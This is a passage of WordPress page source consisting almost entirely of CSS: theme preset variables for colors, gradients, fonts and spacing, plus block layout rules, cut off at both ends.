			padding: 15px 23px 14px;
			text-decoration: none;
			top: 5px;
			width: auto;
			z-index: 100000;
		}
</style>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-86-1" href="https://s0.wp.com/_static/??/wp-content/mu-plugins/core-compat/wp-mediaelement.css,/wp-content/mu-plugins/wpcom-bbpress-premium-themes.css?m=1432920480j&amp;cssminify=yes" type="text/css" media="all">
<style id="global-styles-inline-css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--primary: #dbdbdb;--wp--preset--color--secondary: #efefef;--wp--preset--color--foreground: #dbdbdb;--wp--preset--color--background: #1e1e1e;--wp--preset--color--tertiary: #000000;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: clamp(0.825rem, 0.825rem + ((1vw - 0.2rem) * 0.433), 1.0625rem);--wp--preset--font-size--medium: clamp(1rem, 1rem + ((1vw - 0.2rem) * 0.455), 1.25rem);--wp--preset--font-size--large: clamp(1.25rem, 1.25rem + ((1vw - 0.2rem) * 0.569), 1.563rem);--wp--preset--font-size--x-large: clamp(1.563rem, 1.563rem + ((1vw - 0.2rem) * 0.709), 1.953rem);--wp--preset--font-size--x-small: 0.8rem;--wp--preset--font-size--xx-large: clamp(1.953rem, 1.953rem + ((1vw - 0.2rem) * 0.887), 2.441rem);--wp--preset--font-size--xxx-large: clamp(2.441rem, 2.441rem + ((1vw - 0.2rem) * 1.111), 3.052rem);--wp--preset--font-size--xxxx-large: clamp(3.052rem, 3.052rem + ((1vw - 0.2rem) * 1.387), 3.815rem);--wp--preset--font-size--xxxxx-large: clamp(3.815rem, 3.815rem + ((1vw - 0.2rem) * 1.733), 4.768rem);--wp--preset--font-family--albert-sans: 'Albert Sans', sans-serif;--wp--preset--font-family--alegreya: Alegreya, serif;--wp--preset--font-family--arvo: Arvo, serif;--wp--preset--font-family--bodoni-moda: 'Bodoni Moda', serif;--wp--preset--font-family--bricolage-grotesque: 'Bricolage Grotesque', sans-serif;--wp--preset--font-family--cabin: Cabin, sans-serif;--wp--preset--font-family--chivo: Chivo, sans-serif;--wp--preset--font-family--commissioner: Commissioner, sans-serif;--wp--preset--font-family--cormorant: Cormorant, serif;--wp--preset--font-family--courier-prime: 'Courier Prime', monospace;--wp--preset--font-family--crimson-pro: 'Crimson Pro', serif;--wp--preset--font-family--dm-mono: 'DM Mono', monospace;--wp--preset--font-family--dm-sans: 'DM Sans', sans-serif;--wp--preset--font-family--dm-serif-display: 'DM Serif Display', serif;--wp--preset--font-family--domine: Domine, serif;--wp--preset--font-family--eb-garamond: 'EB Garamond', serif;--wp--preset--font-family--epilogue: Epilogue, sans-serif;--wp--preset--font-family--fahkwang: Fahkwang, sans-serif;--wp--preset--font-family--figtree: Figtree, sans-serif;--wp--preset--font-family--fira-sans: 'Fira Sans', sans-serif;--wp--preset--font-family--fjalla-one: 'Fjalla One', sans-serif;--wp--preset--font-family--fraunces: Fraunces, serif;--wp--preset--font-family--gabarito: Gabarito, system-ui;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--ibm-plex-sans: 'IBM Plex Sans', sans-serif;--wp--preset--font-family--ibarra-real-nova: 'Ibarra Real Nova', serif;--wp--preset--font-family--instrument-serif: 'Instrument Serif', serif;--wp--preset--font-family--inter: Inter;--wp--preset--font-family--josefin-sans: 'Josefin Sans', sans-serif;--wp--preset--font-family--jost: Jost, sans-serif;--wp--preset--font-family--libre-baskerville: 'Libre Baskerville', serif;--wp--preset--font-family--libre-franklin: 'Libre Franklin', sans-serif;--wp--preset--font-family--literata: Literata, serif;--wp--preset--font-family--lora: Lora, serif;--wp--preset--font-family--merriweather: Merriweather, serif;--wp--preset--font-family--montserrat: Montserrat, sans-serif;--wp--preset--font-family--newsreader: Newsreader, serif;--wp--preset--font-family--noto-sans-mono: 'Noto Sans Mono', sans-serif;--wp--preset--font-family--nunito: Nunito, sans-serif;--wp--preset--font-family--open-sans: 'Open Sans', sans-serif;--wp--preset--font-family--overpass: Overpass, sans-serif;--wp--preset--font-family--pt-serif: 'PT Serif', serif;--wp--preset--font-family--petrona: Petrona, serif;--wp--preset--font-family--piazzolla: Piazzolla, serif;--wp--preset--font-family--playfair-display: 'Playfair Display', serif;--wp--preset--font-family--plus-jakarta-sans: 'Plus Jakarta Sans', sans-serif;--wp--preset--font-family--poppins: Poppins, sans-serif;--wp--preset--font-family--raleway: Raleway, sans-serif;--wp--preset--font-family--roboto: Roboto, sans-serif;--wp--preset--font-family--roboto-slab: 'Roboto Slab', serif;--wp--preset--font-family--rubik: Rubik, sans-serif;--wp--preset--font-family--rufina: Rufina, serif;--wp--preset--font-family--sora: Sora, sans-serif;--wp--preset--font-family--source-sans-3: 'Source Sans 3', sans-serif;--wp--preset--font-family--source-serif-4: 'Source Serif 4', serif;--wp--preset--font-family--space-mono: 'Space Mono', monospace;--wp--preset--font-family--syne: Syne, sans-serif;--wp--preset--font-family--texturina: Texturina, serif;--wp--preset--font-family--urbanist: Urbanist, sans-serif;--wp--preset--font-family--work-sans: 'Work Sans', sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.25rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.75rem;--wp--preset--spacing--60: clamp(1.75rem, 3.5211268vw, 3.5rem);--wp--preset--spacing--70: clamp(3.5rem, 7.3943662vw, 5.25rem);--wp--preset--spacing--80: clamp(5.25rem, 12.3239437vw, 8.75rem);--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:root { --wp--style--global--content-size: 620px;--wp--style--global--wide-size: 1200px; }:where(body) { margin: 0; }.wp-site-blocks { padding-top: var(--wp--style--root--padding-top); padding-bottom: var(--wp--style--root--padding-bottom); }.has-global-padding { padding-right: var(--wp--style--root--padding-right); padding-left: var(--wp--style--root--padding-left); }.has-global-padding :where(.has-global-padding:not(.wp-block-block)) { padding-right: 0; padding-left: 0; }.has-global-padding > .alignfull { margin-right: calc(var(--wp--style--root--padding-right) * -1); margin-left: calc(var(--wp--style--root--padding-left) * -1); }.has-global-padding :where(.has-global-padding:not(.wp-block-block)) > .alignfull { margin-right: 0; margin-left: 0; }.has-global-padding > .alignfull:where(:not(.has-global-padding):not(.is-layout-flex):not(.is-layout-grid)) > :where([class*="wp-block-"]:not(.alignfull):not([class*="__"]),.wp-block:not(.alignfull),p,h1,h2,h3,h4,h5,h6,ul,ol) { padding-right: var(--wp--style--root--padding-right); padding-left: var(--wp--style--root--padding-left); }.has-global-padding :where(.has-global-padding) > .alignfull:where(:not(.has-global-padding)) > :where([class*="wp-block-"]:not(.alignfull):not([class*="__"]),.wp-block:not(.alignfull),p,h1,h2,h3,h4,h5,h6,ul,ol) { padding-right: 0; padding-left: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: var(--wp--preset--spacing--50); margin-block-end: 0; }:where(.wp-site-blocks) > :first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child { margin-block-end: 0; }:root { --wp--style--block-gap: var(--wp--preset--spacing--50); }:where(.is-layout-flow)  > :first-child{margin-block-start: 0;}:where(.is-layout-flow)  > :last-child{margin-block-end: 0;}:where(.is-layout-flow)  > *{margin-block-start: var(--wp--preset--spacing--50);margin-block-end: 0;}:where(.is-layout-constrained)  > :first-child{margin-block-start: 0;}:where(.is-layout-constrained)  > :last-child{margin-block-end: 0;}:where(.is-layout-constrained)  > *{margin-block-start: var(--wp--preset--spacing--50);margin-block-end: 0;}:where(.is-layout-flex) {gap: var(--wp--preset--spacing--50);}:where(.is-layout-grid) {gap: var(--wp--preset--spacing--50);}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(body){background-color: var(--wp--preset--color--background);color: var(--wp--preset--color--foreground);font-family: var(--wp--preset--font-family--roboto);font-size: var(--wp--preset--font-size--small);font-style: normal;font-weight: 400;line-height: 1.6;--wp--style--root--padding-top: 0px;--wp--style--root--padding-right: var(--wp--preset--spacing--50);--wp--style--root--padding-bottom: 0px;--wp--style--root--padding-left: var(--wp--preset--spacing--50);}:where(a:where(:not(.wp-element-button))){color: var(--wp--preset--color--foreground);text-decoration: underline;}:where(a:where(:not(.wp-element-button)):hover){color: var(--wp--preset--color--primary);text-decoration: none;}:where(h1, h2, h3, h4, h5, h6){font-family: var(--wp--preset--font-family--space-mono);font-style: normal;font-weight: 400;line-height: 1.15;}:where(h1){font-size: var(--wp--preset--font-size--xxx-large);line-height: 1.127;}:where(h2){font-size: var(--wp--preset--font-size--xx-large);line-height: 1.152;}:where(h3){font-size: var(--wp--preset--font-size--x-large);line-height: 1.28;}:where(h4){font-size: var(--wp--preset--font-size--large);line-height: 1.5;}:where(h5){font-size: var(--wp--preset--font-size--medium);line-height: 1.5;}:where(h6){font-size: var(--wp--preset--font-size--medium);line-height: 1.5;}:where(.wp-element-button, .wp-block-button__link){background-color: var(--wp--preset--color--primary);border-radius: 0.25rem;border-width: 0;color: var(--wp--preset--color--background);font-family: var(--wp--preset--font-family--roboto);font-size: inherit;font-weight: 400;line-height: 1;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;}:where(.wp-element-button:hover, .wp-block-button__link:hover){background-color: var(--wp--preset--color--secondary);color: var(--wp--preset--color--background);}:where(.wp-element-button:focus, .wp-block-button__link:focus){background-color: var(--wp--preset--color--foreground);color: var(--wp--preset--color--background);outline-color: var(--wp--preset--color--primary);outline-offset: 2px;outline-style: dotted;outline-width: 1px;}:where(.wp-element-button:active, .wp-block-button__link:active){background-color: var(--wp--preset--color--foreground);color: var(--wp--preset--color--background);}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-primary-color{color: var(--wp--preset--color--primary) !important;}.has-secondary-color{color: var(--wp--preset--color--secondary) !important;}.has-foreground-color{color: var(--wp--preset--color--foreground) !important;}.has-background-color{color: var(--wp--preset--color--background) !important;}.has-tertiary-color{color: var(--wp--preset--color--tertiary) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-primary-background-color{background-color: var(--wp--preset--color--primary) !important;}.has-secondary-background-color{background-color: var(--wp--preset--color--secondary) !important;}.has-foreground-background-color{background-color: var(--wp--preset--color--foreground) !important;}.has-background-background-color{background-color: var(--wp--preset--color--background) !important;}.has-tertiary-background-color{background-color: var(--wp--preset--color--tertiary) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-primary-border-color{border-color: var(--wp--preset--color--primary) !important;}.has-secondary-border-color{border-color: var(--wp--preset--color--secondary) !important;}.has-foreground-border-color{border-color: var(--wp--preset--color--foreground) !important;}.has-background-border-color{border-color: var(--wp--preset--color--background) !important;}.has-tertiary-border-color{border-color: var(--wp--preset--color--tertiary) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-x-small-font-size{font-size: var(--wp--preset--font-size--x-small) !important;}.has-xx-large-font-size{font-size: var(--wp--preset--font-size--xx-large) !important;}.has-xxx-large-font-size{font-size: var(--wp--preset--font-size--xxx-large) !important;}.has-xxxx-large-font-size{font-size: var(--wp--preset--font-size--xxxx-large) !important;}.has-xxxxx-large-font-size{font-size: var(--wp--preset--font-size--xxxxx-large) !important;}.has-albert-sans-font-family{font-family: var(--wp--preset--font-family--albert-sans) !important;}.has-alegreya-font-family{font-family: var(--wp--preset--font-family--alegreya) !important;}.has-arvo-font-family{font-family: var(--wp--preset--font-family--arvo) !important;}.has-bodoni-moda-font-family{font-family: var(--wp--preset--font-family--bodoni-moda) !important;}.has-bricolage-grotesque-font-family{font-family: var(--wp--preset--font-family--bricolage-grotesque) !important;}.has-cabin-font-family{font-family: var(--wp--preset--font-family--cabin) !important;}.has-chivo-font-family{font-family: var(--wp--preset--font-family--chivo) !important;}.has-commissioner-font-family{font-family: var(--wp--preset--font-family--commissioner) !important;}.has-cormorant-font-family{font-family: var(--wp--preset--font-family--cormorant) !important;}.has-courier-prime-font-family{font-family: var(--wp--preset--font-family--courier-prime) !important;}.has-crimson-pro-font-family{font-family: var(--wp--preset--font-family--crimson-pro) !important;}.has-dm-mono-font-family{font-family: var(--wp--preset--font-family--dm-mono) !important;}.has-dm-sans-font-family{font-family: var(--wp--preset--font-family--dm-sans) !important;}.has-dm-serif-display-font-family{font-family: var(--wp--preset--font-family--dm-serif-display) !important;}.has-domine-font-family{font-family: var(--wp--preset--font-family--domine) !important;}.has-eb-garamond-font-family{font-family: var(--wp--preset--font-family--eb-garamond) !important;}.has-epilogue-font-family{font-family: var(--wp--preset--font-family--epilogue) !important;}.has-fahkwang-font-family{font-family: var(--wp--preset--font-family--fahkwang) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-fira-sans-font-family{font-family: var(--wp--preset--font-family--fira-sans) !important;}.has-fjalla-one-font-family{font-family: var(--wp--preset--font-family--fjalla-one) !important;}.has-fraunces-font-family{font-family: var(--wp--preset--font-family--fraunces) !important;}.has-gabarito-font-family{font-family: var(--wp--preset--font-family--gabarito) !important;}.has-ibm-plex-mono-font-family{font-family: var(--wp--preset--font-family--ibm-plex-mono) !important;}.has-ibm-plex-sans-font-family{font-family: var(--wp--preset--font-family--ibm-plex-sans) !important;}.has-ibarra-real-nova-font-family{font-family: var(--wp--preset--font-family--ibarra-real-nova) !important;}.has-instrument-serif-font-family{font-family: var(--wp--preset--font-family--instrument-serif) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-josefin-sans-font-family{font-family: var(--wp--preset--font-family--josefin-sans) !important;}.has-jost-font-family{font-family: var(--wp--preset--font-family--jost) !important;}.has-libre-baskerville-font-family{font-family: var(--wp--preset--font-family--libre-baskerville) !important;}.has-libre-franklin-font-family{font-family: var(--wp--preset--font-family--libre-franklin) !important;}.has-literata-font-family{font-family: var(--wp--preset--font-family--literata) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-merriweather-font-family{font-family: var(--wp--preset--font-family--merriweather) !important;}.has-montserrat-font-family{font-family: var(--wp--preset--font-family--montserrat) !important;}.has-newsreader-font-family{font-family: var(--wp--preset--font-family--newsreader) !important;}.has-noto-sans-mono-font-family{font-family: var(--wp--preset--font-family--noto-sans-mono) !important;}.has-nunito-font-family{font-family: var(--wp--preset--font-family--nunito) !important;}.has-open-sans-font-family{font-family: var(--wp--preset--font-family--open-sans) !important;}.has-overpass-font-family{font-family: var(--wp--preset--font-family--overpass) !important;}.has-pt-serif-font-family{font-family: var(--wp--preset--font-family--pt-serif) !important;}.has-petrona-font-family{font-family: var(--wp--preset--font-family--petrona) !important;}.has-piazzolla-font-family{font-family: var(--wp--preset--font-family--piazzolla) !important;}.has-playfair-display-font-family{font-family: var(--wp--preset--font-family--playfair-display) !important;}.has-plus-jakarta-sans-font-family{font-family: var(--wp--preset--font-family--plus-jakarta-sans) !important;}.has-poppins-font-family{font-family: var(--wp--preset--font-family--poppins) !important;}.has-raleway-font-family{font-family: var(--wp--preset--font-family--raleway) !important;}.has-roboto-font-family{font-family: var(--wp--preset--font-family--roboto) !important;}.has-roboto-slab-font-family{font-family: var(--wp--preset--font-family--roboto-slab) !important;}.has-rubik-font-family{font-family: var(--wp--preset--font-family--rubik) !important;}.has-rufina-font-family{font-family: var(--wp--preset--font-family--rufina) !important;}.has-sora-font-family{font-family: var(--wp--preset--font-family--sora) !important;}.has-source-sans-3-font-family{font-family: var(--wp--preset--font-family--source-sans-3) !important;}.has-source-serif-4-font-family{font-family: var(--wp--preset--font-family--source-serif-4) !important;}.has-space-mono-font-family{font-family: var(--wp--preset--font-family--space-mono) !important;}.has-syne-font-family{font-family: var(--wp--preset--font-family--syne) !important;}.has-texturina-font-family{font-family: var(--wp--preset--font-family--texturina) !important;}.has-urbanist-font-family{font-family: var(--wp--preset--font-family--urbanist) !important;}.has-work-sans-font-family{font-family: var(--wp--preset--font-family--work-sans) !important;}
:where(.wp-block-button .wp-block-button__link){background-color: var(--wp--preset--color--secondary);line-height: 1;padding-top: var(--wp--preset--spacing--40);padding-bottom: var(--wp--preset--spacing--40);}.wp-block-button.is-style-outline .wp-block-button__link{border-color: var(--wp--preset--color--secondary);color: var(--wp--preset--color--secondary);padding-top: 14px;padding-bottom: 14px;}
:where(.wp-block-buttons-is-layout-flow)  > :first-child{margin-block-start: 0;}:where(.wp-block-buttons-is-layout-flow)  > :last-child{margin-block-end: 0;}:where(.wp-block-buttons-is-layout-flow)  > *{margin-block-start: var(--wp--preset--spacing--40);margin-block-end: 0;}:where(.wp-block-buttons-is-layout-constrained)  > :first-child{margin-block-start: 0;}:where(.wp-block-buttons-is-layout-constrained)  > :last-child{margin-block-end: 0;}:where(.wp-block-buttons-is-layout-constrained)  > *{margin-block-start: var(--wp--preset--spacing--40);margin-block-end: 0;}:where(.wp-block-buttons-is-layout-flex) {gap: var(--wp--preset--spacing--40);}:where(.wp-block-buttons-is-layout-grid) {gap: var(--wp--preset--spacing--40);}
:where(.wp-block-code){border-radius: 0.25rem;border-color: var(--wp--preset--color--foreground);border-width: 2px;border-style: solid;font-family: monospace;padding-top: var(--wp--preset--spacing--50);padding-right: var(--wp--preset--spacing--50);padding-bottom: var(--wp--preset--spacing--50);padding-left: var(--wp--preset--spacing--50);}
:where(.wp-block-comment-author-name){font-size: var(--wp--preset--font-size--x-small);}
:where(.wp-block-comment-date){font-size: var(--wp--preset--font-size--x-small);}
:where(.wp-block-comment-edit-link){font-size: var(--wp--preset--font-size--x-small);}
:where(.wp-block-comment-reply-link){font-size: var(--wp--preset--font-size--x-small);}
:where(.wp-block-heading){color: var(--wp--preset--color--foreground);}
:where(.wp-block-heading a:where(:not(.wp-element-button))){color: var(--wp--preset--color--foreground);}
:where(.wp-block-list){padding-left: var(--wp--preset--spacing--50);}
:where(.wp-block-navigation){font-size: var(--wp--preset--font-size--small);}
:where(.wp-block-navigation a:where(:not(.wp-element-button))){text-decoration: none;}
:where(.wp-block-navigation a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
:where(.wp-block-post-date){color: var(--wp--preset--color--foreground);font-size: var(--wp--preset--font-size--x-small);}
:where(.wp-block-post-date a:where(:not(.wp-element-button))){text-decoration: none;}
:where(.wp-block-post-date a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
:where(.wp-block-post-terms){font-size: var(--wp--preset--font-size--x-small);}
:where(.wp-block-post-title){color: var(--wp--preset--color--foreground);font-size: var(--wp--preset--font-size--xxx-large);}
:where(.wp-block-post-title a:where(:not(.wp-element-button))){color: var(--wp--preset--color--foreground);text-decoration: none;}
:where(.wp-block-post-title a:where(:not(.wp-element-button)):hover){color: var(--wp--preset--color--primary);text-decoration: underline;}
:where(.wp-block-quote){border-color: var(--wp--preset--color--foreground);border-width: 0 0 0 5px;border-style: solid;font-style: italic;padding-left: var(--wp--preset--spacing--50);}.wp-block-quote.is-style-plain{border-width: 0;font-style: normal;padding-left: 0;}
:where(.wp-block-search .wp-block-search__label, .wp-block-search .wp-block-search__input, .wp-block-search .wp-block-search__button){font-size: var(--wp--preset--font-size--small);line-height: 1.2;}
:where(.wp-block-site-tagline){font-size: var(--wp--preset--font-size--small);}
:where(.wp-block-site-title){font-family: var(--wp--preset--font-family--space-mono);font-size: var(--wp--preset--font-size--medium);font-style: normal;font-weight: 400;}
:where(.wp-block-site-title a:where(:not(.wp-element-button))){color: var(--wp--preset--color--foreground);text-decoration: none;}
:where(.wp-block-site-title a:where(:not(.wp-element-button)):hover){color: var(--wp--preset--color--foreground);text-decoration: underline;}
:where(.wp-block-post-navigation-link){font-family: var(--wp--preset--font-family--space-mono);}
/* Remove block gap between first-level blocks */ :where(.wp-site-blocks) > * { margin-block-start: 0; margin-block-end: 0; }
</style>
<style id="core-block-supports-inline-css">
.wp-elements-7cf85e8acea8fb751b878283f7cbee06 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--background);}.wp-container-core-social-links-is-layout-1{justify-content:center;}.wp-container-content-2{flex-grow:1;}.wp-container-core-group-is-layout-1{flex-wrap:nowrap;justify-content:space-between;}.wp-container-core-columns-is-layout-1{flex-wrap:nowrap;gap:2em 0;}.wp-container-core-navigation-is-layout-1{justify-content:center;}.wp-container-core-group-is-layout-3 > .alignfull{margin-right:calc(var(--wp--preset--spacing--50) * -1);margin-left:calc(var(--wp--preset--spacing--50) * -1);}.wp-container-core-group-is-layout-3 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-group-is-layout-3 > * + *{margin-block-start:var(--wp--preset--spacing--50);margin-block-end:0;}.wp-container-core-group-is-layout-4{justify-content:center;}.wp-container-core-group-is-layout-5{flex-wrap:nowrap;justify-content:center;}.wp-container-core-group-is-layout-7{flex-wrap:nowrap;gap:0.26rem;justify-content:center;align-items:center;}.wp-container-core-group-is-layout-8 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-group-is-layout-8 > * + *{margin-block-start:var(--wp--preset--spacing--40);margin-block-end:0;}.wp-container-core-group-is-layout-10{gap:0.26rem;}.wp-container-core-column-is-layout-5 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-column-is-layout-5 > * + *{margin-block-start:var(--wp--preset--spacing--40);margin-block-end:0;}.wp-container-core-columns-is-layout-2{flex-wrap:nowrap;gap:2em var(--wp--preset--spacing--40);}.wp-container-core-group-is-layout-11{gap:0.26rem;}.wp-container-core-column-is-layout-7 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-column-is-layout-7 > * + *{margin-block-start:var(--wp--preset--spacing--40);margin-block-end:0;}.wp-container-core-columns-is-layout-3{flex-wrap:nowrap;gap:2em 